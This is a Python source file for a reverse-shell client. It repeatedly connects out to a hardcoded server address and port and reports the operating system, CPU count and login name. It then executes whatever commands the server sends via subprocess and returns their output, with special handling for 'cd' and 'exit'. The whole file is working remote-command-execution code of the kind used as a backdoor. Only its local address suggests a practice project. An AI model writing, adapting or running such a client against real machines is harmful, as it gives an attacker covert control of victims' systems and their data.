import socket
import time
import subprocess
import os
from os import (
    chdir,
    getcwd,
    getlogin,
    cpu_count,
)


class Client:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.buffer = ''

    def connection_handler(self):
        """
            Tries to connect to the Server each N seconds then calls the shell function
        """
        # Define the number of seconds to wait
        time.sleep(2)
        print('[+] Trying to connect...')
        #  Infinite loop so the program tries to connect every N seconds
        while True:
            try:
                # tries to connect to the server
                self.sock.connect(('127.0.1.1', 23164))
                print("[+] Connection established")
                self.set_initial_buffer()
                # it breaks the loop if I can connect since no error has been thrown
                break
            except ConnectionRefusedError as e:
                print(f'[{e.errno}] Couldn\'t connect to host.')
                self.connection_handler()
            except PermissionError as e:
                print(f'[{e.errno}] Connection with host interrupted by the host.')
                self.socket_lifecycle_handler()
            except OSError as e:
                print(f'[{e.errno}] Already connected to host.')
                return True
        return True

    def set_initial_buffer(self):
        self.buffer = (
            f'Operating system : {os.name}. \n'
            f'CPU Count : {cpu_count()}. \n'
            f'Login : {getlogin()}'
        )

    def socket_lifecycle_handler(self):
        """
            Handle the behavior of the socket.
            When the current socket is closed, it create a new one.
        """
        self.sock.close()
        self.create_socket()

    @staticmethod
    def is_special_shell_command(command):
        """
            Handle the keyword for the exit of the shell.
            Handle the changing directory path and his potential errors.
        """
        try:
            if command.startswith('cd') or command.startswith('chdir'):
                directory_path = command.split(maxsplit=1)[1]
                chdir(directory_path)
                return f'Current directory : {getcwd()}'
            elif command == 'exit':
                return 'exit'
        except FileNotFoundError as e:
            return f'[{e.errno}] No such file or directory "{directory_path}"'
        return False

    @staticmethod
    def shell(command):
        """
            Listen to the commands made by the Server.
        """
        shell_result = subprocess.run(
            command.split(' '),
            capture_output=True,
            check=True
        )
        if shell_result.returncode == 0:
            return shell_result.stdout
        else:
            return shell_result.stderr

    def create_socket(self):
        """
            Create a new socket and call the connection_handler() method.
        """
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection_handler()

    def main(self):
        self.connection_handler()
        print(self.buffer)
        while True:
            data = self.sock.recv(1024)
            command = data.decode('utf-8')
            special_command = self.is_special_shell_command(command)

            if special_command == 'exit':
                break

            if not special_command:
                shell_response = self.shell(command)
                self.sock.sendall(shell_response)
            else:
                self.sock.sendall(special_command.encode('utf-8'))


if __name__ == '__main__':
    Client().main()
